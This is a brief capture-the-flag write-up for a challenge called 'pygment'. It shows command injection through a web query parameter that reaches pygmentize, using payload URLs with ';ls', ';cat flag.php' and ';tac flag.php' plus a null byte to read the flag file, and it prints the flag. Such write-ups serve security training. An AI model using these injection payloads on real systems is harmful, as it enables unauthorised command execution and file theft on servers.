# pygment

After looking a little around and doing a dirsearch we get that is has pygmentize.
After looking only for it we get this issue from the pygmentize repo: https://github.com/dedalozzo/pygmentize/issues/1

So we remember when we saw some erros with some variables a and b.
So we go and do:
`http://34.141.8.29:32311/?a=&b=;ls%00`

Boom it works.
So we do:
`http://34.141.8.29:32311/?a=&b=;cat flag.php%00`

But we get no flag.
So I tried doing:
`http://34.141.8.29:32311/?a=&b=;tac flag.php%00`

flag: `ctf{2ae4644b1e4cbc1f560c52f3ee0985043d3e0acf0f766851382974646578ec39}`